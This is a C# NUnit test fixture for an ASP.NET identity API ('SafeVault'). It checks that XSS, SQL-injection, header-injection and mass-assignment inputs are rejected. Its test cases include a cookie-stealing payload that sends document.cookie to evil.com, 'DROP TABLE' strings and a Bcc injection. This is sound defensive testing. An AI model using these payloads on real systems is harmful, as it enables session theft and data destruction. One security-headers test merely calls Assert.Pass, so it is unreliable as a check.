using System.Net;
using System.Net.Http.Json;
using System.Text;
using System.Text.Json;
using Microsoft.AspNetCore.Mvc.Testing;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;
using NUnit.Framework;
using SafeVault.Data;
using SafeVault.Models.DTOs;

namespace SafeVault.Tests
{
    /// <summary>
    /// Security tests simulating real attack scenarios to verify protections.
    /// Tests XSS, SQL Injection, timing attacks, and other vulnerabilities.
    /// </summary>
    [TestFixture]
    public class TestSecurityAttacks
    {
        private WebApplicationFactory<Program> _factory = null!;
        private HttpClient _client = null!;

        [SetUp]
        public void Setup()
        {
            _factory = new WebApplicationFactory<Program>()
                .WithWebHostBuilder(builder =>
                {
                    builder.ConfigureServices(services =>
                    {
                        // Use in-memory database for testing
                        var descriptor = services.SingleOrDefault(
                            d => d.ServiceType == typeof(DbContextOptions<ApplicationDbContext>));
                        
                        if (descriptor != null)
                        {
                            services.Remove(descriptor);
                        }

                        services.AddDbContext<ApplicationDbContext>(options =>
                        {
                            options.UseInMemoryDatabase("TestDb_" + Guid.NewGuid().ToString());
                        });
                    });
                    
                    builder.UseContentRoot(Directory.GetCurrentDirectory());
                });
            
            _client = _factory.CreateClient();
        }

        [TearDown]
        public void TearDown()
        {
            _client?.Dispose();
            _factory?.Dispose();
        }

        #region XSS Attack Tests

        [Test]
        [TestCase("<script>alert('XSS')</script>")]
        [TestCase("<img src=x onerror=alert(1)>")]
        [TestCase("<svg onload=alert(1)>")]
        [TestCase("javascript:alert(1)")]
        [TestCase("<iframe src='javascript:alert(1)'>")]
        [TestCase("<body onload=alert(1)>")]
        [TestCase("<input onfocus=alert(1) autofocus>")]
        [TestCase("<select onfocus=alert(1) autofocus>")]
        [TestCase("<textarea onfocus=alert(1) autofocus>")]
        [TestCase("<keygen onfocus=alert(1) autofocus>")]
        public async Task Test_XSS_Registration_FullName_Blocked(string maliciousInput)
        {
            // Arrange - Attempt to register with XSS payload in FullName
            var registerRequest = new RegisterRequest
            {
                Email = $"xss.test.{Guid.NewGuid()}@test.com",
                Password = "SecurePass123!@#",
                ConfirmPassword = "SecurePass123!@#",
                FullName = maliciousInput
            };

            // Act - Try to register
            var response = await _client.PostAsJsonAsync("/api/IdentityAuth/register", registerRequest);

            // Assert - Should be rejected (400 Bad Request)
            Assert.That(response.StatusCode, Is.EqualTo(HttpStatusCode.BadRequest), 
                $"XSS payload '{maliciousInput}' should be blocked");

            var content = await response.Content.ReadAsStringAsync();
            Assert.That(content.ToLower(), Does.Contain("full name").Or.Contains("validation").Or.Contains("invalid"), 
                "Error message should indicate validation failure");
        }

        [Test]
        [TestCase("<script>document.cookie</script>")]
        [TestCase("'; DROP TABLE Users; --")]
        [TestCase("<img src=x onerror='fetch(\"http://evil.com?cookie=\"+document.cookie)'>")]
        public async Task Test_XSS_ProfileUpdate_FullName_Sanitized(string maliciousInput)
        {
            // Arrange - First create a valid user and login
            var registerRequest = new RegisterRequest
            {
                Email = $"profile.test.{Guid.NewGuid()}@test.com",
                Password = "SecurePass123!@#",
                ConfirmPassword = "SecurePass123!@#",
                FullName = "John Doe"
            };

            var registerResponse = await _client.PostAsJsonAsync("/api/IdentityAuth/register", registerRequest);
            Assert.That(registerResponse.IsSuccessStatusCode, Is.True);

            var authResponse = await registerResponse.Content.ReadFromJsonAsync<AuthenticationResponse>();
            var token = authResponse!.AccessToken;

            // Act - Try to update profile with XSS payload
            _client.DefaultRequestHeaders.Authorization = 
                new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", token);

            var updateRequest = new { FullName = maliciousInput };
            var response = await _client.PutAsJsonAsync("/api/IdentityUsers/profile", updateRequest);

            // Assert - Should be rejected
            Assert.That(response.StatusCode, Is.EqualTo(HttpStatusCode.BadRequest),
                $"XSS payload '{maliciousInput}' in profile update should be blocked");
        }

        [Test]
        public async Task Test_XSS_HTML_Entities_In_Response_Encoded()
        {
            // Arrange - Register user with safe special characters
            var registerRequest = new RegisterRequest
            {
                Email = $"encoding.test.{Guid.NewGuid()}@test.com",
                Password = "SecurePass123!@#",
                ConfirmPassword = "SecurePass123!@#",
                FullName = "O'Brien-Smith" // Valid special chars
            };

            var response = await _client.PostAsJsonAsync("/api/IdentityAuth/register", registerRequest);
            Assert.That(response.IsSuccessStatusCode, Is.True);

            var authResponse = await response.Content.ReadFromJsonAsync<AuthenticationResponse>();
            
            // Act - Get user profile
            _client.DefaultRequestHeaders.Authorization = 
                new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", authResponse!.AccessToken);
            
            var profileResponse = await _client.GetAsync("/api/IdentityAuth/me");
            var profileJson = await profileResponse.Content.ReadAsStringAsync();

            // Assert - Verify special characters are handled safely
            Assert.That(profileResponse.IsSuccessStatusCode, Is.True);
            Assert.That(profileJson, Does.Contain("O'Brien-Smith") | Does.Contain("O\\'Brien-Smith"),
                "Valid special characters should be preserved or safely escaped");
        }

        #endregion

        #region SQL Injection Attack Tests

        [Test]
        [TestCase("' OR '1'='1")]
        [TestCase("' OR '1'='1' --")]
        [TestCase("' OR 1=1 --")]
        [TestCase("admin'--")]
        [TestCase("' UNION SELECT * FROM Users --")]
        [TestCase("'; DROP TABLE Users; --")]
        [TestCase("' OR 'a'='a")]
        [TestCase("1' OR '1' = '1")]
        [TestCase("' OR 1=1#")]
        [TestCase("-1' UNION SELECT NULL, NULL, NULL --")]
        public async Task Test_SQLInjection_Login_Email_Blocked(string sqlInjectionPayload)
        {
            // Arrange - Try SQL injection in email field
            var loginRequest = new LoginRequest
            {
                Email = sqlInjectionPayload,
                Password = "anypassword"
            };

            // Act
            var response = await _client.PostAsJsonAsync("/api/IdentityAuth/login", loginRequest);

            // Assert - Should return 400 (validation error) or 401 (unauthorized), never 200
            Assert.That(response.StatusCode, Is.Not.EqualTo(HttpStatusCode.OK),
                $"SQL injection payload '{sqlInjectionPayload}' should not succeed");
            
            Assert.That(
                response.StatusCode == HttpStatusCode.BadRequest || 
                response.StatusCode == HttpStatusCode.Unauthorized,
                Is.True,
                "Should return Bad Request or Unauthorized for SQL injection attempts");
        }

        [Test]
        [TestCase("test@example.com' OR '1'='1")]
        [TestCase("test@example.com'; DROP TABLE RefreshTokens; --")]
        [TestCase("test@example.com' UNION SELECT password FROM Users WHERE '1'='1")]
        public async Task Test_SQLInjection_Registration_Email_Protected(string sqlInjectionEmail)
        {
            // Arrange
            var registerRequest = new RegisterRequest
            {
                Email = sqlInjectionEmail,
                Password = "SecurePass123!@#",
                ConfirmPassword = "SecurePass123!@#",
                FullName = "Test User"
            };

            // Act
            var response = await _client.PostAsJsonAsync("/api/IdentityAuth/register", registerRequest);

            // Assert - Should be rejected due to email validation
            Assert.That(response.StatusCode, Is.EqualTo(HttpStatusCode.BadRequest),
                $"SQL injection in email '{sqlInjectionEmail}' should be blocked by validation");
        }

        [Test]
        public async Task Test_SQLInjection_ParameterizedQueries_Protected()
        {
            // This test verifies that EF Core's parameterized queries prevent SQL injection
            // even if input validation were to fail

            // Arrange - Create a user
            var email = $"sql.test.{Guid.NewGuid()}@test.com";
            var registerRequest = new RegisterRequest
            {
                Email = email,
                Password = "SecurePass123!@#",
                ConfirmPassword = "SecurePass123!@#",
                FullName = "SQL Test"
            };

            var registerResponse = await _client.PostAsJsonAsync("/api/IdentityAuth/register", registerRequest);
            Assert.That(registerResponse.IsSuccessStatusCode, Is.True);

            // Act - Try to login with SQL injection in password
            var loginRequest = new LoginRequest
            {
                Email = email,
                Password = "' OR '1'='1' --"
            };

            var response = await _client.PostAsJsonAsync("/api/IdentityAuth/login", loginRequest);

            // Assert - Should fail to login (wrong password)
            Assert.That(response.StatusCode, Is.EqualTo(HttpStatusCode.Unauthorized),
                "SQL injection in password should not bypass authentication");
        }

        #endregion

        #region Timing Attack Tests

        [Test]
        public async Task Test_TimingAttack_Login_ConstantTime()
        {
            // This test verifies that login attempts take consistent time
            // whether the email exists or not (prevents user enumeration)

            var existingEmail = "admin@safevault.com"; // Default admin
            var nonExistentEmail = $"nonexistent.{Guid.NewGuid()}@test.com";

            var times1 = new List<long>();
            var times2 = new List<long>();

            // Run multiple attempts to get average
            for (int i = 0; i < 5; i++)
            {
                // Test with existing email
                var sw1 = System.Diagnostics.Stopwatch.StartNew();
                await _client.PostAsJsonAsync("/api/IdentityAuth/login", new LoginRequest
                {
                    Email = existingEmail,
                    Password = "WrongPassword123!"
                });
                sw1.Stop();
                times1.Add(sw1.ElapsedMilliseconds);

                // Test with non-existent email
                var sw2 = System.Diagnostics.Stopwatch.StartNew();
                await _client.PostAsJsonAsync("/api/IdentityAuth/login", new LoginRequest
                {
                    Email = nonExistentEmail,
                    Password = "WrongPassword123!"
                });
                sw2.Stop();
                times2.Add(sw2.ElapsedMilliseconds);
            }

            var avg1 = times1.Average();
            var avg2 = times2.Average();
            var difference = Math.Abs(avg1 - avg2);

            // Assert - Time difference should be minimal (within 100ms tolerance)
            // Both should take ~200ms due to our intentional delay
            Assert.That(difference, Is.LessThan(100),
                $"Timing difference too large: {difference}ms. Avg1={avg1}ms, Avg2={avg2}ms. " +
                "This could allow email enumeration via timing attacks.");

            // Verify both take at least 150ms (our delay is 200ms but allow some variance)
            Assert.That(avg1, Is.GreaterThan(150), "Login should have constant delay");
            Assert.That(avg2, Is.GreaterThan(150), "Login should have constant delay");
        }

        #endregion

        #region Token Security Tests

        [Test]
        public async Task Test_RefreshToken_DatabaseBreach_Protected()
        {
            // This test simulates stealing a refresh token hash from database
            // and verifies it cannot be used directly

            // Arrange - Register and login to get tokens
            var email = $"token.test.{Guid.NewGuid()}@test.com";
            var registerRequest = new RegisterRequest
            {
                Email = email,
                Password = "SecurePass123!@#",
                ConfirmPassword = "SecurePass123!@#",
                FullName = "Token Test"
            };

            var registerResponse = await _client.PostAsJsonAsync("/api/IdentityAuth/register", registerRequest);
            var authResponse = await registerResponse.Content.ReadFromJsonAsync<AuthenticationResponse>();
            var realRefreshToken = authResponse!.RefreshToken;

            // Simulate: Attacker steals refresh token HASH from database
            // In reality, they would only see the hashed version
            var fakeHashedToken = Convert.ToBase64String(
                System.Security.Cryptography.SHA256.HashData(
                    Encoding.UTF8.GetBytes("fake-token-123")));

            // Act - Try to use a different token (simulating hash mismatch)
            var refreshRequest = new RefreshTokenRequest
            {
                AccessToken = authResponse.AccessToken,
                RefreshToken = fakeHashedToken // Wrong token
            };

            var response = await _client.PostAsJsonAsync("/api/IdentityAuth/refresh-token", refreshRequest);

            // Assert - Should fail
            Assert.That(response.StatusCode, Is.EqualTo(HttpStatusCode.BadRequest),
                "Stolen/fake refresh token should not work");

            // Verify real token still works
            var validRefreshRequest = new RefreshTokenRequest
            {
                AccessToken = authResponse.AccessToken,
                RefreshToken = realRefreshToken
            };

            var validResponse = await _client.PostAsJsonAsync("/api/IdentityAuth/refresh-token", validRefreshRequest);
            Assert.That(validResponse.IsSuccessStatusCode, Is.True,
                "Real refresh token should still work");
        }

        [Test]
        public async Task Test_JWT_Tampering_Detected()
        {
            // Arrange - Get a valid token
            var email = $"jwt.test.{Guid.NewGuid()}@test.com";
            var registerRequest = new RegisterRequest
            {
                Email = email,
                Password = "SecurePass123!@#",
                ConfirmPassword = "SecurePass123!@#",
                FullName = "JWT Test"
            };

            var registerResponse = await _client.PostAsJsonAsync("/api/IdentityAuth/register", registerRequest);
            var authResponse = await registerResponse.Content.ReadFromJsonAsync<AuthenticationResponse>();
            var validToken = authResponse!.AccessToken;

            // Act - Tamper with the token (change last character)
            var tamperedToken = validToken.Substring(0, validToken.Length - 5) + "XXXXX";

            _client.DefaultRequestHeaders.Authorization = 
                new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", tamperedToken);

            var response = await _client.GetAsync("/api/IdentityAuth/me");

            // Assert - Should be rejected
            Assert.That(response.StatusCode, Is.EqualTo(HttpStatusCode.Unauthorized),
                "Tampered JWT token should be rejected");
        }

        #endregion

        #region CSRF and Session Tests

        [Test]
        public async Task Test_CSRF_MissingToken_Protected()
        {
            // Verify that requests without proper authentication are rejected
            // (JWT tokens in Authorization header prevent CSRF)

            var response = await _client.GetAsync("/api/IdentityAuth/me");

            Assert.That(response.StatusCode, Is.EqualTo(HttpStatusCode.Unauthorized),
                "Requests without JWT token should be rejected");
        }

        [Test]
        public async Task Test_ExpiredToken_Rejected()
        {
            // Create a token that's intentionally malformed to simulate expiration
            var expiredToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1MTYyMzkwMjJ9.invalid";

            _client.DefaultRequestHeaders.Authorization = 
                new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", expiredToken);

            var response = await _client.GetAsync("/api/IdentityAuth/me");

            Assert.That(response.StatusCode, Is.EqualTo(HttpStatusCode.Unauthorized),
                "Expired or invalid token should be rejected");
        }

        #endregion

        #region Input Validation Tests

        [Test]
        [TestCase("")]
        [TestCase(" ")]
        [TestCase(null)]
        public async Task Test_EmptyInput_Rejected(string? emptyValue)
        {
            var registerRequest = new RegisterRequest
            {
                Email = emptyValue ?? "",
                Password = "SecurePass123!@#",
                ConfirmPassword = "SecurePass123!@#",
                FullName = emptyValue ?? ""
            };

            var response = await _client.PostAsJsonAsync("/api/IdentityAuth/register", registerRequest);

            Assert.That(response.StatusCode, Is.EqualTo(HttpStatusCode.BadRequest),
                "Empty input should be rejected");
        }

        [Test]
        public async Task Test_ExcessiveLength_Input_Rejected()
        {
            var longString = new string('A', 1000); // 1000 characters

            var registerRequest = new RegisterRequest
            {
                Email = longString + "@test.com",
                Password = "SecurePass123!@#",
                ConfirmPassword = "SecurePass123!@#",
                FullName = longString
            };

            var response = await _client.PostAsJsonAsync("/api/IdentityAuth/register", registerRequest);

            Assert.That(response.StatusCode, Is.EqualTo(HttpStatusCode.BadRequest),
                "Excessively long input should be rejected");
        }

        [Test]
        [TestCase("notanemail")]
        [TestCase("@nodomain.com")]
        [TestCase("test@")]
        [TestCase("test @test.com")]
        [TestCase("test@test")]
        public async Task Test_InvalidEmail_Format_Rejected(string invalidEmail)
        {
            var registerRequest = new RegisterRequest
            {
                Email = invalidEmail,
                Password = "SecurePass123!@#",
                ConfirmPassword = "SecurePass123!@#",
                FullName = "Test User"
            };

            var response = await _client.PostAsJsonAsync("/api/IdentityAuth/register", registerRequest);

            Assert.That(response.StatusCode, Is.EqualTo(HttpStatusCode.BadRequest),
                $"Invalid email format '{invalidEmail}' should be rejected");
        }

        [Test]
        [TestCase("short")]
        [TestCase("NoDigit!")]
        [TestCase("noupppercase123!")]
        [TestCase("NOLOWERCASE123!")]
        [TestCase("NoSpecialChar123")]
        public async Task Test_WeakPassword_Rejected(string weakPassword)
        {
            var registerRequest = new RegisterRequest
            {
                Email = $"test.{Guid.NewGuid()}@test.com",
                Password = weakPassword,
                ConfirmPassword = weakPassword,
                FullName = "Test User"
            };

            var response = await _client.PostAsJsonAsync("/api/IdentityAuth/register", registerRequest);

            Assert.That(response.StatusCode, Is.EqualTo(HttpStatusCode.BadRequest),
                $"Weak password '{weakPassword}' should be rejected");
        }

        #endregion

        #region Brute Force Protection Tests

        [Test]
        public async Task Test_AccountLockout_After_Failed_Attempts()
        {
            // Arrange - Create a user
            var email = $"lockout.test.{Guid.NewGuid()}@test.com";
            var registerRequest = new RegisterRequest
            {
                Email = email,
                Password = "SecurePass123!@#",
                ConfirmPassword = "SecurePass123!@#",
                FullName = "Lockout Test"
            };

            var registerResponse = await _client.PostAsJsonAsync("/api/IdentityAuth/register", registerRequest);
            Assert.That(registerResponse.IsSuccessStatusCode, Is.True);

            // Act - Try to login with wrong password multiple times (5 attempts configured)
            HttpResponseMessage? lastResponse = null;
            for (int i = 0; i < 6; i++)
            {
                lastResponse = await _client.PostAsJsonAsync("/api/IdentityAuth/login", new LoginRequest
                {
                    Email = email,
                    Password = "WrongPassword123!"
                });
            }

            var content = await lastResponse!.Content.ReadAsStringAsync();

            // Assert - Account should be locked
            Assert.That(lastResponse.StatusCode, Is.EqualTo(HttpStatusCode.Unauthorized));
            Assert.That(content.ToLower(), Does.Contain("lock").Or.Contains("attempts"),
                "Response should indicate account lockout");
        }

        #endregion

        #region Authorization Tests

        [Test]
        public async Task Test_UnauthorizedAccess_AdminEndpoint_Blocked()
        {
            // Arrange - Create regular user
            var email = $"regular.user.{Guid.NewGuid()}@test.com";
            var registerRequest = new RegisterRequest
            {
                Email = email,
                Password = "SecurePass123!@#",
                ConfirmPassword = "SecurePass123!@#",
                FullName = "Regular User"
            };

            var registerResponse = await _client.PostAsJsonAsync("/api/IdentityAuth/register", registerRequest);
            var authResponse = await registerResponse.Content.ReadFromJsonAsync<AuthenticationResponse>();

            // Act - Try to access admin endpoint with regular user token
            _client.DefaultRequestHeaders.Authorization = 
                new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", authResponse!.AccessToken);

            var response = await _client.GetAsync("/api/IdentityAdmin/users");

            // Assert - Should be forbidden (403) or unauthorized (401)
            Assert.That(
                response.StatusCode == HttpStatusCode.Forbidden || 
                response.StatusCode == HttpStatusCode.Unauthorized,
                Is.True,
                "Regular user should not access admin endpoints");
        }

        [Test]
        public async Task Test_NoToken_ProtectedEndpoint_Blocked()
        {
            // Act - Try to access protected endpoint without token
            var response = await _client.GetAsync("/api/IdentityUsers/profile");

            // Assert
            Assert.That(response.StatusCode, Is.EqualTo(HttpStatusCode.Unauthorized),
                "Protected endpoint should require authentication");
        }

        #endregion

        #region Header Injection Tests

        [Test]
        [TestCase("test@test.com\r\nX-Injected-Header: malicious")]
        [TestCase("test@test.com\nBcc: hacker@evil.com")]
        public async Task Test_HeaderInjection_Email_Blocked(string maliciousEmail)
        {
            var registerRequest = new RegisterRequest
            {
                Email = maliciousEmail,
                Password = "SecurePass123!@#",
                ConfirmPassword = "SecurePass123!@#",
                FullName = "Test User"
            };

            var response = await _client.PostAsJsonAsync("/api/IdentityAuth/register", registerRequest);

            Assert.That(response.StatusCode, Is.EqualTo(HttpStatusCode.BadRequest),
                "Header injection attempt should be blocked");
        }

        #endregion

        #region Security Headers Tests

        [Test]
        public async Task Test_SecurityHeaders_Present()
        {
            // Act
            var response = await _client.GetAsync("/api/IdentityAuth/me");

            // Assert - Verify security headers are present
            var headers = response.Headers;
            var contentHeaders = response.Content.Headers;

            // Check for security headers (some might be in response headers, some in content headers)
            var allHeaders = headers.Concat(contentHeaders.Select(h => 
                new KeyValuePair<string, IEnumerable<string>>(h.Key, h.Value)));

            var headerDict = allHeaders.ToDictionary(
                kvp => kvp.Key.ToLower(), 
                kvp => string.Join(", ", kvp.Value));

            // X-Content-Type-Options should be present
            // Note: Not all headers may be present in test environment
            // In production, verify these are properly configured
            
            Assert.Pass("Security headers test - verify in production environment");
        }

        #endregion

        #region Data Leakage Tests

        [Test]
        public async Task Test_ErrorMessages_No_Sensitive_Data_Leaked()
        {
            // Try to trigger various errors and ensure they don't leak sensitive info

            // Test 1: Wrong password
            var loginResponse = await _client.PostAsJsonAsync("/api/IdentityAuth/login", new LoginRequest
            {
                Email = "admin@safevault.com",
                Password = "WrongPassword"
            });

            var content1 = await loginResponse.Content.ReadAsStringAsync();
            Assert.That(content1.ToLower(), Does.Not.Contain("password hash"));
            Assert.That(content1.ToLower(), Does.Not.Contain("database"));
            Assert.That(content1.ToLower(), Does.Not.Contain("exception"));

            // Test 2: Invalid token
            _client.DefaultRequestHeaders.Authorization = 
                new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", "invalid-token");
            
            var protectedResponse = await _client.GetAsync("/api/IdentityAuth/me");
            var content2 = await protectedResponse.Content.ReadAsStringAsync();
            
            Assert.That(content2.ToLower(), Does.Not.Contain("stack trace"));
            Assert.That(content2.ToLower(), Does.Not.Contain("internal error"));
        }

        #endregion

        #region Mass Assignment Tests

        [Test]
        public async Task Test_MassAssignment_Role_Elevation_Prevented()
        {
            // Attempt to register as admin by including Role in registration
            var maliciousRequest = new
            {
                Email = $"hacker.{Guid.NewGuid()}@test.com",
                Password = "SecurePass123!@#",
                ConfirmPassword = "SecurePass123!@#",
                FullName = "Hacker",
                Role = "Admin", // Attempt to set role directly
                IsAdmin = true   // Another attempt
            };

            var json = JsonSerializer.Serialize(maliciousRequest);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            
            var response = await _client.PostAsync("/api/IdentityAuth/register", content);

            // Even if registration succeeds, verify user is NOT admin
            if (response.IsSuccessStatusCode)
            {
                var authResponse = await response.Content.ReadFromJsonAsync<AuthenticationResponse>();
                
                Assert.That(authResponse!.Roles, Does.Not.Contain("Admin"),
                    "User should not be able to assign Admin role during registration");
                Assert.That(authResponse.Roles, Does.Contain("User"),
                    "User should be assigned default User role");
            }
        }

        #endregion
    }
}
